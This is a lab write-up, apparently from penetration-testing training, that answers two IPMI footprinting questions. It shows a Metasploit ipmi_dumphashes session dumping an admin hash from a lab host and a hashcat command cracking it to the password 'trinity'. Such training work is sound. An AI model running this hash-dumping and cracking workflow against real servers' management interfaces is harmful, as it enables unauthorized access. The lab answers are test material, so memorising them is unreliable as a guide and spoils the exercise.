# Section 16: IPMI

Module: 04. Footprinting

---

## Questions & Answers

### 1. What username is configured for accessing the host via IPMI?

Context:
```bash
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_dumphashes 
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                        Required  Description
   ----                  ---------------                                        --------  -----------
   CRACK_COMMON          true                                                   yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                          no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                             no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_p  yes       File containing common passwords for offline cracking, one per line
                         asswords.txt
   RHOSTS                                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                                                                          html
   RPORT                 623                                                    yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                      yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                      yes       Delay between session retries in seconds
   THREADS               1                                                      yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_u  yes       File containing usernames, one per line
                         sers.txt


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> set RHOSTS 10.129.134.88
RHOSTS => 10.129.134.88
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> exploit
[+] 10.129.134.88:623 - IPMI - Hash found: admin:f7fe2c48022e00003a535e8de1e61b3dd6a68d3b366b95a99eaa69fc9287b2a3e676725de2fd5976a123456789abcdefa123456789abcdef140561646d696e:67ae4992f4241a4b67bd94de1d2d07f5c80530f5
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> 
```

**Answer:** `admin`

---

### 2. What is the account's cleartext password?

Context:
```bash
$ hashcat -m 13900 -a 0 -o cracked.txt admin:f7fe2c48022e00003a535e8de1e61b3dd6a68d3b366b95a99eaa69fc9287b2a3e676725de2fd5976a123456789abcdefa123456789abcdef140561646d696e:67ae4992f4241a4b67bd94de1d2d07f5c80530f5 ipmi_common_passwords.txt
```

**Answer:** `trinity`

---

[Back to Module Index](./README.md)
